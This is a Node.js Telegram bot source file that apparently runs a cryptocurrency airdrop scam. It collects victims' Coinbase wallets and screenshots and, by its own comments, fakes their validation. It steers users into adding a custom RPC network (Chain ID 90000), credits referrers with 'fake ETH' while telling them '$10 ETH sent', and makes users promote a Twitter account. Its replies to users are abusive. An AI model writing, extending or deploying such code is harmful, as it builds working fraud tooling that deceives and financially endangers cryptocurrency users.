require('dotenv').config();
const { Telegraf } = require('telegraf');
const express = require('express');
const mongoose = require('mongoose');
const User = require('./models/User');
const { sendFakeETH } = require('./utils/tenderly');
const { RPC_GUIDE } = require('./bot/rpcGuide');
const { extract } = require('./utils/ocr');

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();
app.use(express.json());
app.use(bot.webhookCallback(`/bot${process.env.BOT_TOKEN}`));

mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("MongoDB connected"))
  .catch(err => console.log("DB error:", err));

// /start
bot.start(async (ctx) => {
  let user = await User.findOne({ telegramId: ctx.from.id });
  if (!user) {
    const code = Math.random().toString(36).substr(2, 8).toUpperCase();
    const ref = ctx.startPayload?.startsWith('ref_') ? ctx.startPayload.slice(4) : null;
    user = new User({ telegramId: ctx.from.id, username: ctx.from.username, referralCode: code, referredBy: ref, stage: 'wallet_ss' });
    await user.save();

    if (ref) {
      const referrer = await User.findOne({ referralCode: ref });
      if (referrer && referrer.wallet) {
        referrer.referrals.push(ctx.from.id);
        referrer.totalEarned += 10;
        await referrer.save();
        await sendFakeETH(referrer.wallet, 0.004);
        bot.telegram.sendMessage(referrer.telegramId, `+1 referral! $10 ETH sent.`);
      }
    }
  }
  ctx.reply(`Drop Coinbase wallet + screenshot, fucker.`);
});

// Photo Handler — FAKE VALIDATION
bot.on('photo', async (ctx) => {
  const user = await User.findOne({ telegramId: ctx.from.id });
  if (!user) return;

  // FAKE: Always pass wallet stage
  if (user.stage === 'wallet_ss') {
    user.wallet = "0xFAKE" + Math.random().toString(16).substr(2, 40);
    user.stage = 'rpc_guide';
    await user.save();
    ctx.reply(RPC_GUIDE, { reply_markup: { inline_keyboard: [[{ text: "I Added Network", callback_data: "rpc_done" }]] }});
    return;
  }

  // FAKE: Always pass RPC proof
  if (user.stage === 'rpc_proof') {
    user.stage = 'twitter_tasks';
    await user.save();
    ctx.reply(`RPC locked. Now follow @BjExchange53077, like pinned post, tag 3 friends. Send proof.`);
    return;
  }

  ctx.reply("Photo received. Keep going, fucker.");
});

bot.action('rpc_done', async (ctx) => {
  const user = await User.findOne({ telegramId: ctx.from.id });
  user.stage = 'rpc_proof';
  await user.save();
  ctx.reply("Send screenshot of Chain ID 90000 now.");
});

app.listen(process.env.PORT || 3000, () => {
  console.log("Bot running...");
  bot.telegram.setWebhook(`${process.env.RENDER_EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`);
});
